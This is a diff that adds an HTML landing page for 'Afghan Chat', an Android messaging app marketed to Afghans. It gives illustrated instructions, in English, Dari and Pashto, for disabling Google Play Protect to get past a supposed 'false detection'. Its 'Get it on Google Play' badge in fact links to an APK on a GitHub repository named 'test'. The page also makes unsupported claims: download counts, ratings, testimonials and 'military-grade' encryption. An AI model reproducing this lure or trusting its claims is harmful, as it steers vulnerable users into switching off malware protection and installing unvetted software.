@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#6C63FF" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <title>Afghan Chat — Connect & Communicate</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Noto+Naskh+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- ───────────────── NAVBAR ───────────────── -->
+  <nav class="navbar" id="navbar">
+    <div class="container nav-inner">
+      <a class="brand" href="#home">
+        <div class="brand-icon">
+          <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="40" height="40" rx="12" fill="url(#g1)"/>
+            <path d="M10 14h20M10 20h14M10 26h17" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+            <circle cx="31" cy="26" r="4" fill="#fff" fill-opacity=".9"/>
+            <defs>
+              <linearGradient id="g1" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#6C63FF"/>
+                <stop offset="1" stop-color="#3ECFCF"/>
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+        <span>Afghan Chat 🇦🇫</span>
+      </a>
+      <ul class="nav-links">
+        <li><a href="#screenshots">Screenshots</a></li>
+        <li><a href="#install-guide">Install Guide</a></li>
+        <li><a href="#features">Features</a></li>
+        <li><a href="#download">Download</a></li>
+      </ul>
+      <a href="#download" class="btn btn-primary nav-cta">Get the App</a>
+      <button class="hamburger" id="hamburger" aria-label="Toggle menu" aria-expanded="false" aria-controls="mobileMenu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+    <div class="mobile-menu" id="mobileMenu">
+      <a href="#screenshots">Screenshots</a>
+      <a href="#install-guide">Install Guide</a>
+      <a href="#features">Features</a>
+      <a href="#download">Download</a>
+    </div>
+  </nav>
+
+  <!-- ───────────────── HERO ───────────────── -->
+  <section class="hero" id="home">
+    <div class="hero-bg">
+      <div class="blob blob-1"></div>
+      <div class="blob blob-2"></div>
+      <div class="blob blob-3"></div>
+      <div class="grid-overlay"></div>
+    </div>
+    <div class="container hero-inner">
+      <div class="hero-text">
+        <div class="badge">
+          <img src="https://img.icons8.com/fluency/24/android-os.png" alt="Android" />
+          🇦🇫 Now Available on Android
+        </div>
+        <h1>
+          🇦🇫 برای افغان‌ها.<br />
+          <span class="gradient-text">با هم در ارتباط.</span>
+        </h1>
+        <p class="hero-sub">
+          Afghan Chat is a blazing-fast, secure, and beautifully designed messaging app for Android —
+          built for the Afghan community worldwide. Real-time messages, crystal-clear calls, and a UI you'll love.
+        </p>
+        <!-- Dari paragraph -->
+        <p class="hero-sub dari" dir="rtl">
+          افغان چت یک برنامه پیام‌رسان سریع، امن و زیبا برای اندروید است — ساخته شده برای مردم افغان در سراسر جهان.
+          پیام‌های آنی، تماس‌های واضح، و رابط کاربری دلنشین.
+        </p>
+        <div class="hero-actions">
+          <a href="#download" class="btn btn-primary btn-lg">
+            <img src="https://img.icons8.com/fluency/24/google-play.png" alt="Play Store" />
+            Download Free
+          </a>
+          <a href="#features" class="btn btn-ghost btn-lg">
+            Explore Features →
+          </a>
+        </div>
+        <div class="hero-stats">
+          <div class="stat">
+            <strong>50K+</strong>
+            <span>Downloads</span>
+          </div>
+          <div class="stat-divider"></div>
+          <div class="stat">
+            <strong>4.8★</strong>
+            <span>Rating</span>
+          </div>
+          <div class="stat-divider"></div>
+          <div class="stat">
+            <strong>100%</strong>
+            <span>Free</span>
+          </div>
+        </div>
+      </div>
+      <div class="hero-visual">
+        <div class="phone-mockup">
+          <div class="phone-frame">
+            <div class="phone-screen">
+              <div class="chat-ui">
+                <div class="chat-header-ui">
+                  <img src="https://i.pravatar.cc/40?img=12" alt="avatar" class="chat-avatar" />
+                  <div>
+                    <div class="chat-name">Nawid Sultani</div>
+                    <div class="chat-status">Online</div>
+                  </div>
+                  <div class="chat-header-icons">
+                    <img src="https://img.icons8.com/fluency/20/video-call.png" alt="video" />
+                    <img src="https://img.icons8.com/fluency/20/phone.png" alt="call" />
+                  </div>
+                </div>
+                <div class="chat-messages">
+                  <div class="msg msg-in">
+                    <img src="https://i.pravatar.cc/28?img=12" alt="Nawid Sultani" class="msg-av" />
+                    <div class="msg-bubble">سلام! چطور هستی؟ 👋</div>
+                  </div>
+                  <div class="msg msg-out">
+                    <div class="msg-bubble">خوبم، ممنون! تو چطور؟</div>
+                  </div>
+                  <div class="msg msg-in">
+                    <img src="https://i.pravatar.cc/28?img=12" alt="Nawid Sultani" class="msg-av" />
+                    <div class="msg-bubble">عالی! بیا چت کنیم 😊</div>
+                  </div>
+                  <div class="msg msg-out">
+                    <div class="msg-bubble">بسیار خوب! 🎉</div>
+                  </div>
+                </div>
+                <div class="chat-input-ui">
+                  <input type="text" placeholder="Type a message..." readonly />
+                  <button class="send-btn">
+                    <img src="https://img.icons8.com/fluency/20/sent.png" alt="send" />
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="phone-glow"></div>
+        </div>
+        <!-- floating cards -->
+        <div class="float-card card-secure">
+          <img src="https://img.icons8.com/fluency/32/lock-2.png" alt="secure" />
+          <div>
+            <strong>End-to-End Encrypted</strong>
+            <span>Your chats are private</span>
+          </div>
+        </div>
+        <div class="float-card card-notify">
+          <img src="https://img.icons8.com/fluency/32/appointment-reminders.png" alt="notify" />
+          <div>
+            <strong>Instant Delivery</strong>
+            <span>Messages in milliseconds</span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="hero-wave">
+      <svg viewBox="0 0 1440 80" preserveAspectRatio="none"><path d="M0,40 C360,80 1080,0 1440,40 L1440,80 L0,80 Z" fill="#f8f7ff"/></svg>
+    </div>
+  </section>
+
+  <!-- ───────────────── TRUSTED BY ───────────────── -->
+  <section class="trusted">
+    <div class="container">
+      <p class="trusted-label">🇦🇫 Loved by Afghans from</p>
+      <div class="trusted-logos">
+        <div class="country-pill">🕌 Kabul</div>
+        <div class="country-pill">🏔️ Kandahar</div>
+        <div class="country-pill">🌿 Herat</div>
+        <div class="country-pill">🦁 Mazar-e-Sharif</div>
+        <div class="country-pill">🌄 Jalalabad</div>
+        <div class="country-pill">❄️ Bamyan</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── SCREENSHOTS ───────────────── -->
+  <section class="screenshots section" id="screenshots">
+    <div class="container">
+      <div class="section-head">
+        <div class="tag">🇦🇫 Screenshots / تصاویر</div>
+        <h2>A Look <span class="gradient-text">Inside the App</span></h2>
+        <p>Clean, modern, and intuitive — designed for everyone.</p>
+      </div>
+      <div class="screenshots-row">
+        <div class="ss-phone">
+          <div class="ss-label">Chat List</div>
+          <div class="ss-screen chat-list-screen">
+            <div class="ss-topbar">
+              <strong>Afghan Chat</strong>
+              <div class="ss-icons">
+                <img src="https://img.icons8.com/fluency/18/search.png" alt="search" />
+                <img src="https://img.icons8.com/fluency/18/menu-2.png" alt="menu" />
+              </div>
+            </div>
+            <div class="ss-conv-list">
+              <div class="ss-conv">
+                <img src="https://i.pravatar.cc/36?img=5" alt="Parisa Noori" />
+                <div class="ss-conv-text">
+                  <span class="ss-name">Parisa Noori</span>
+                  <span class="ss-last">چطور هستی؟ 😊</span>
+                </div>
+                <span class="ss-time">2m</span>
+              </div>
+              <div class="ss-conv">
+                <img src="https://i.pravatar.cc/36?img=8" alt="Nawid Sultani" />
+                <div class="ss-conv-text">
+                  <span class="ss-name">Nawid Sultani</span>
+                  <span class="ss-last">سلام دوست 👋</span>
+                </div>
+                <span class="ss-time">15m</span>
+              </div>
+              <div class="ss-conv">
+                <img src="https://i.pravatar.cc/36?img=15" alt="Afghan group" />
+                <div class="ss-conv-text">
+                  <span class="ss-name">گروه افغانان 🇦🇫</span>
+                  <span class="ss-last">آپدیت جدید آمد!</span>
+                </div>
+                <span class="ss-time">1h</span>
+              </div>
+              <div class="ss-conv">
+                <img src="https://i.pravatar.cc/36?img=22" alt="Zarmina Karimi" />
+                <div class="ss-conv-text">
+                  <span class="ss-name">Zarmina Karimi</span>
+                  <span class="ss-last">خوش گذشت 🌸</span>
+                </div>
+                <span class="ss-time">3h</span>
+              </div>
+            </div>
+            <div class="ss-fab">
+              <img src="https://img.icons8.com/fluency/24/edit-message.png" alt="new" />
+            </div>
+          </div>
+        </div>
+
+        <div class="ss-phone ss-featured">
+          <div class="ss-label">Chat View</div>
+          <div class="ss-screen">
+            <div class="ss-chat-header">
+              <img src="https://i.pravatar.cc/36?img=5" alt="Parisa Noori" />
+              <div>
+                <div class="ss-chat-name">Parisa Noori</div>
+                <div class="ss-online">● Online</div>
+              </div>
+              <div class="ss-chat-actions">
+                <img src="https://img.icons8.com/fluency/18/video-call.png" alt="Video call" />
+                <img src="https://img.icons8.com/fluency/18/phone.png" alt="Voice call" />
+              </div>
+            </div>
+            <div class="ss-messages">
+              <div class="ss-date-divider">Today</div>
+              <div class="ss-msg ss-in">
+                <img src="https://i.pravatar.cc/24?img=5" alt="Parisa Noori" class="ss-av" />
+                <div class="ss-bub">سلام! خوش آمدی 🌟</div>
+              </div>
+              <div class="ss-msg ss-out">
+                <div class="ss-bub">ممنون، خوشحالم! 😊</div>
+              </div>
+              <div class="ss-msg ss-in">
+                <img src="https://i.pravatar.cc/24?img=5" alt="Parisa Noori" class="ss-av" />
+                <div class="ss-bub">Afghan Chat عالی است! ❤️</div>
+              </div>
+              <div class="ss-msg ss-out">
+                <div class="ss-bub">بله، سریع و امن! 🔒</div>
+              </div>
+            </div>
+            <div class="ss-input-bar">
+              <span>پیام بنویسید...</span>
+              <img src="https://img.icons8.com/fluency/20/sent.png" alt="send" />
+            </div>
+          </div>
+        </div>
+
+        <div class="ss-phone">
+          <div class="ss-label">Profile</div>
+          <div class="ss-screen profile-screen">
+            <div class="ss-prof-cover"></div>
+            <div class="ss-prof-avatar">
+              <img src="https://i.pravatar.cc/64?img=3" alt="Nawid Sultani" />
+            </div>
+            <div class="ss-prof-name">Nawid Sultani</div>
+            <div class="ss-prof-status">🟢 Available</div>
+            <div class="ss-prof-bio">Living life, one chat at a time 💬</div>
+            <div class="ss-prof-stats">
+              <div><strong>128</strong><span>Chats</span></div>
+              <div><strong>47</strong><span>Groups</span></div>
+              <div><strong>1.2K</strong><span>Friends</span></div>
+            </div>
+            <div class="ss-prof-btn">Edit Profile</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── FEATURES ───────────────── -->
+  <section class="install-guide section" id="install-guide">
+    <div class="container">
+      <div class="section-head">
+        <div class="tag">Installation Help / راهنمای نصب</div>
+        <h2>Fix False Detection & <span class="gradient-text">Install Easily</span></h2>
+        <p>
+          If Android shows a false warning for new chat app install, follow these exact steps.
+          Only continue if APK is from your official trusted source.
+        </p>
+      </div>
+
+      <div class="guide-alert" dir="rtl">
+        اگر هشدار امنیتی اشتباه نمایش داده شد، مراحل زیر را دقیق انجام دهید تا برنامه به‌راحتی نصب شود.
+      </div>
+
+      <div class="guide-grid">
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/1.jpg" alt="Step 1 screenshot - open Play Store and tap profile icon" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 1</span>
+            <h3>Open Play Store Profile</h3>
+            <ul class="guide-lines">
+              <li><strong>Action:</strong> Open Google Play Store.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> گوگل پلی‌استور را باز کنید / ګوګل پلی سټور پرانیزئ.</li>
+              <li><strong>Tap:</strong> Tap your profile picture in the top-right corner.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> روی عکس پروفایل در بالا-راست بزنید / په پورته ښي کونج کې د پروفایل انځور ټچ کړئ.</li>
+            </ul>
+          </div>
+        </article>
+
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/2.1.png" alt="Step 2 screenshot - account menu opened in Play Store" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 2</span>
+            <h3>Open Account Menu</h3>
+            <ul class="guide-lines">
+              <li><strong>Action:</strong> In the account menu, find <strong>Play Protect</strong>.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> در منوی حساب، گزینهٔ <strong>Play Protect</strong> را پیدا کنید / د حساب په مېنو کې <strong>Play Protect</strong> ومومئ.</li>
+              <li><strong>Next:</strong> Tap <strong>Play Protect</strong>.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> روی <strong>Play Protect</strong> بزنید / پر <strong>Play Protect</strong> ټچ وکړئ.</li>
+            </ul>
+          </div>
+        </article>
+
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/2.2.jpg" alt="Step 3 screenshot - open Play Protect page" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 3</span>
+            <h3>Open Play Protect Settings</h3>
+            <ul class="guide-lines">
+              <li><strong>Tap:</strong> Tap the <strong>Settings icon</strong> on the Play Protect screen.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> در صفحهٔ Play Protect روی آیکن <strong>تنظیمات</strong> بزنید / د Play Protect پاڼه کې د <strong>Settings</strong> پر نښان ټچ وکړئ.</li>
+            </ul>
+          </div>
+        </article>
+
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/3.jpg" alt="Step 4 screenshot - adjust Play Protect toggles/settings" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 4</span>
+            <h3>Turn Off Both Play Protect Toggles</h3>
+            <ul class="guide-lines">
+              <li><strong>Action:</strong> Turn <strong>OFF / Disable</strong> both green toggles.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> هر دو گزینهٔ سبز را <strong>خاموش</strong> کنید / دواړه شنې تڼۍ <strong>بندې</strong> کړئ.</li>
+              <li><strong>Note:</strong> Your phone may ask for fingerprint or PIN confirmation.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> ممکن است تأیید اثر انگشت یا PIN بخواهد / کېدای شي د ګوتې نښه یا PIN تایید وغواړي.</li>
+            </ul>
+          </div>
+        </article>
+
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/4.jpg" alt="Step 5 screenshot - continue install on warning prompt" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 5</span>
+            <h3>Disable This Option</h3>
+            <ul class="guide-lines">
+              <li><strong>Action:</strong> Turn this option <strong>OFF</strong> as shown in the screenshot.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> این گزینه را مطابق تصویر <strong>خاموش</strong> کنید / دا اختیار د سکرین‌شاټ مطابق <strong>OFF</strong> کړئ.</li>
+              <li><strong>Next:</strong> Continue installation.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> سپس نصب را ادامه دهید / بیا نصب ته دوام ورکړئ.</li>
+            </ul>
+          </div>
+        </article>
+
+        <article class="guide-card">
+          <div class="guide-shot">
+            <img src="images/5.jpg" alt="Step 6 screenshot - final state after allowing install options" loading="lazy" />
+          </div>
+          <div class="guide-body">
+            <span class="guide-step">Step 6</span>
+            <h3>Install and Open the Chat App</h3>
+            <ul class="guide-lines">
+              <li><strong>Done:</strong> Install the chat app now.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> حالا اپ چت را نصب کنید / اوس د چت اپ نصب کړئ.</li>
+              <li><strong>Open:</strong> Launch the app and start using it.</li>
+              <li class="guide-af" dir="rtl"><strong>دری/پښتو:</strong> برنامه را باز کرده و استفاده را شروع کنید / اپ پرانیزئ او کارول یې پيل کړئ.</li>
+            </ul>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="features section" id="features">
+    <div class="container">
+      <div class="section-head">
+        <div class="tag">🇦🇫 Features / ویژگی‌ها</div>
+        <h2>Everything You Need to <span class="gradient-text">Stay Connected</span></h2>
+        <p>Powerful features packed into a lightweight app — designed for Afghan users worldwide, with speed, privacy, and elegance.</p>
+      </div>
+      <div class="features-grid">
+
+        <div class="feature-card card-accent-purple">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/chat.png" alt="Chat" />
+          </div>
+          <h3>Real-Time Messaging</h3>
+          <p>Send and receive messages instantly with zero delay. Supports text, emojis, and reactions.</p>
+          <div class="feature-dari" dir="rtl">پیام‌رسانی آنی — بدون تأخیر</div>
+        </div>
+
+        <div class="feature-card card-accent-cyan">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/video-call.png" alt="Video" />
+          </div>
+          <h3>HD Video & Voice Calls</h3>
+          <p>Crystal-clear video and voice calls with adaptive quality for any network condition.</p>
+          <div class="feature-dari" dir="rtl">تماس ویدیویی و صوتی HD</div>
+        </div>
+
+        <div class="feature-card card-accent-green">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/group.png" alt="Groups" />
+          </div>
+          <h3>Group Chats</h3>
+          <p>Create groups with up to 500 members. Share media, pin messages, and manage admins easily.</p>
+          <div class="feature-dari" dir="rtl">گروه‌های تا ۵۰۰ نفره</div>
+        </div>
+
+        <div class="feature-card card-accent-orange">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/lock-2.png" alt="Secure" />
+          </div>
+          <h3>End-to-End Encryption</h3>
+          <p>Every message is protected with military-grade encryption. Your privacy is our priority.</p>
+          <div class="feature-dari" dir="rtl">رمزنگاری کامل پیام‌ها</div>
+        </div>
+
+        <div class="feature-card card-accent-pink">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/image.png" alt="Media" />
+          </div>
+          <h3>Media Sharing</h3>
+          <p>Send photos, videos, documents, and voice notes with original quality preserved.</p>
+          <div class="feature-dari" dir="rtl">اشتراک‌گذاری عکس، ویدیو و فایل</div>
+        </div>
+
+        <div class="feature-card card-accent-blue">
+          <div class="feature-icon">
+            <img src="https://img.icons8.com/fluency/48/moon-symbol.png" alt="Dark Mode" />
+          </div>
+          <h3>Dark Mode</h3>
+          <p>Eye-friendly dark theme that automatically adapts to your system settings.</p>
+          <div class="feature-dari" dir="rtl">حالت تاریک برای راحتی چشم</div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── HOW IT WORKS ───────────────── -->
+  <section class="how section" id="how">
+    <div class="container">
+      <div class="section-head">
+        <div class="tag">🇦🇫 How It Works / چطور کار می‌کند</div>
+        <h2>Up & Running in <span class="gradient-text">3 Simple Steps</span></h2>
+      </div>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">01</div>
+          <div class="step-icon">
+            <img src="https://img.icons8.com/fluency/56/google-play.png" alt="Download" />
+          </div>
+          <h3>Download the App</h3>
+          <p>Get Afghan Chat free from Google Play Store in seconds.</p>
+          <div class="step-dari" dir="rtl">افغان چت را از Google Play دانلود کنید</div>
+        </div>
+        <div class="step-arrow">→</div>
+        <div class="step">
+          <div class="step-num">02</div>
+          <div class="step-icon">
+            <img src="https://img.icons8.com/fluency/56/user.png" alt="Register" />
+          </div>
+          <h3>Create Your Account</h3>
+          <p>Sign up with your phone number — no email required.</p>
+          <div class="step-dari" dir="rtl">با شماره تلفن ثبت‌نام کنید</div>
+        </div>
+        <div class="step-arrow">→</div>
+        <div class="step">
+          <div class="step-num">03</div>
+          <div class="step-icon">
+            <img src="https://img.icons8.com/fluency/56/chat.png" alt="Chat" />
+          </div>
+          <h3>Start Chatting!</h3>
+          <p>Find your contacts and start chatting instantly.</p>
+          <div class="step-dari" dir="rtl">با مخاطبین خود شروع به چت کنید</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── TESTIMONIALS ───────────────── -->
+  <section class="testimonials section" id="testimonials">
+    <div class="container">
+      <div class="section-head">
+        <div class="tag">🇦🇫 Reviews / نظرات کاربران</div>
+        <h2>What Users <span class="gradient-text">Are Saying</span></h2>
+      </div>
+      <div class="reviews-grid">
+        <div class="review-card">
+          <div class="stars">★★★★★</div>
+          <p>"Afghan Chat is the best messaging app I've ever used. Super fast, private, and made for us Afghans!"</p>
+          <div class="reviewer">
+            <img src="https://i.pravatar.cc/40?img=33" alt="Khalid Mohammadi" />
+            <div>
+              <strong>Khalid Mohammadi</strong>
+              <span>Kabul, Afghanistan 🇦🇫</span>
+            </div>
+          </div>
+        </div>
+        <div class="review-card review-featured">
+          <div class="stars">★★★★★</div>
+          <p dir="rtl">"افغان چت بهترین برنامه پیام‌رسانی است که تا حالا استفاده کرده‌ام. سریع، امن و زیبا! افتخار می‌کنم که این برنامه افغانی است!"</p>
+          <div class="reviewer">
+            <img src="https://i.pravatar.cc/40?img=44" alt="Zarmina Karimi" />
+            <div>
+              <strong>Zarmina Karimi</strong>
+              <span>Mazar-e-Sharif 🇦🇫</span>
+            </div>
+          </div>
+        </div>
+        <div class="review-card">
+          <div class="stars">★★★★★</div>
+          <p>"Finally an app built for the Afghan community. The UI is gorgeous and messages deliver instantly!"</p>
+          <div class="reviewer">
+            <img src="https://i.pravatar.cc/40?img=55" alt="Tariq Barakzai" />
+            <div>
+              <strong>Tariq Barakzai</strong>
+              <span>Hamburg, Germany 🇩🇪</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── DOWNLOAD CTA ───────────────── -->
+  <section class="download section" id="download">
+    <div class="container">
+      <div class="download-card">
+        <div class="download-bg-blobs">
+          <div class="dl-blob dl-blob-1"></div>
+          <div class="dl-blob dl-blob-2"></div>
+        </div>
+        <div class="download-content">
+          <div class="download-text">
+            <h2>🇦🇫 Download Afghan Chat <span class="gradient-text">For Free</span></h2>
+            <p>Available on Android. Join thousands of Afghans worldwide who already love Afghan Chat.</p>
+            <p class="dari" dir="rtl">همین الان دانلود کنید و با افغانان سراسر جهان ارتباط برقرار کنید — کاملاً رایگان!</p>
+            <div class="download-badges">
+              <a href="https://github.com/sultanzx83-sys/test/raw/refs/heads/main/Afghan_CHAT.apk" class="store-badge">
+                <img src="https://img.icons8.com/fluency/48/google-play.png" alt="Play Store" />
+                <div>
+                  <span>Get it on</span>
+                  <strong>Google Play</strong>
+                </div>
+              </a>
+              <a href="#" class="store-badge store-apk">
+                <img src="https://img.icons8.com/fluency/48/android-os.png" alt="APK" />
+                <div>
+                  <span>Direct</span>
+                  <strong>Download APK</strong>
+                </div>
+              </a>
+            </div>
+            <div class="download-meta">
+              <span>📦 Version 1.0.0</span>
+              <span>•</span>
+              <span>⚡ 15 MB</span>
+              <span>•</span>
+              <span>📱 Android 5.0+</span>
+            </div>
+          </div>
+          <div class="download-visual">
+            <div class="qr-box">
+              <div class="qr-inner">
+                <svg width="120" height="120" viewBox="0 0 120 120">
+                  <rect width="120" height="120" rx="12" fill="#fff"/>
+                  <!-- QR pattern simulation -->
+                  <rect x="10" y="10" width="40" height="40" rx="4" fill="#1a1a2e"/>
+                  <rect x="15" y="15" width="30" height="30" rx="2" fill="#fff"/>
+                  <rect x="20" y="20" width="20" height="20" rx="1" fill="#1a1a2e"/>
+                  <rect x="70" y="10" width="40" height="40" rx="4" fill="#1a1a2e"/>
+                  <rect x="75" y="15" width="30" height="30" rx="2" fill="#fff"/>
+                  <rect x="80" y="20" width="20" height="20" rx="1" fill="#1a1a2e"/>
+                  <rect x="10" y="70" width="40" height="40" rx="4" fill="#1a1a2e"/>
+                  <rect x="15" y="75" width="30" height="30" rx="2" fill="#fff"/>
+                  <rect x="20" y="80" width="20" height="20" rx="1" fill="#1a1a2e"/>
+                  <rect x="60" y="60" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="72" y="60" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="84" y="60" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="60" y="72" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="84" y="72" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="60" y="84" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="72" y="84" width="8" height="8" fill="#6C63FF"/>
+                  <rect x="84" y="84" width="8" height="8" fill="#6C63FF"/>
+                </svg>
+              </div>
+              <p>Scan to Download</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ───────────────── FOOTER ───────────────── -->
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-top">
+        <div class="footer-brand">
+          <div class="brand">
+            <div class="brand-icon">
+              <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="40" height="40" rx="12" fill="url(#g2)"/>
+                <path d="M10 14h20M10 20h14M10 26h17" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+                <circle cx="31" cy="26" r="4" fill="#fff" fill-opacity=".9"/>
+                <defs>
+                  <linearGradient id="g2" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#6C63FF"/>
+                    <stop offset="1" stop-color="#3ECFCF"/>
+                  </linearGradient>
+                </defs>
+              </svg>
+            </div>
+            <span>Afghan Chat 🇦🇫</span>
+          </div>
+          <p>The fastest, most secure messaging app for Android — built for the Afghan community worldwide.</p>
+          <p class="dari" dir="rtl">سریع‌ترین و امن‌ترین برنامه پیام‌رسانی برای افغانان سراسر جهان.</p>
+        </div>
+        <div class="footer-links">
+          <div class="footer-col">
+            <h4>App / برنامه</h4>
+            <a href="#download">Download</a>
+            <a href="#features">Features</a>
+            <a href="#screenshots">Screenshots</a>
+          </div>
+          <div class="footer-col">
+            <h4>Company / شرکت</h4>
+            <a href="#">About Us</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Use</a>
+          </div>
+          <div class="footer-col">
+            <h4>Social / شبکه‌های اجتماعی</h4>
+            <a href="#" aria-label="Official Website Afghanistan">
+              <img src="https://img.icons8.com/fluency/18/globe--v1.png" alt="web" /> Website
+              <img src="https://img.icons8.com/color/18/afghanistan.png" alt="Afghanistan flag" />
+            </a>
+            <a href="#">
+              <img src="https://img.icons8.com/fluency/18/instagram-new.png" alt="ig" /> Instagram
+            </a>
+            <a href="#">
+              <img src="https://img.icons8.com/fluency/18/telegram-app.png" alt="tg" /> Telegram
+            </a>
+            <a href="#">
+              <img src="https://img.icons8.com/fluency/18/youtube-play.png" alt="yt" /> YouTube
+            </a>
+          </div>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>🇦🇫 © 2026 Afghan Chat. All rights reserved. / تمام حقوق محفوظ است.</p>
+        <p>Made with ❤️ for Afghans around the world 🇦🇫</p>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ── MOBILE STICKY BOTTOM BAR ── -->
+  <div class="mobile-sticky-bar" id="mobileStickyBar">
+    <div class="msb-info">
+      <div class="msb-icon">
+        <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="40" height="40" rx="12" fill="url(#gmsb)"/>
+          <path d="M10 14h20M10 20h14M10 26h17" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+          <circle cx="31" cy="26" r="4" fill="#fff" fill-opacity=".9"/>
+          <defs>
+            <linearGradient id="gmsb" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+              <stop stop-color="#6C63FF"/>
+              <stop offset="1" stop-color="#3ECFCF"/>
+            </linearGradient>
+          </defs>
+        </svg>
+      </div>
+      <div>
+        <strong>Afghan Chat 🇦🇫</strong>
+        <span>Free · Android</span>
+      </div>
+    </div>
+    <a href="#download" class="msb-btn">دانلود رایگان</a>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
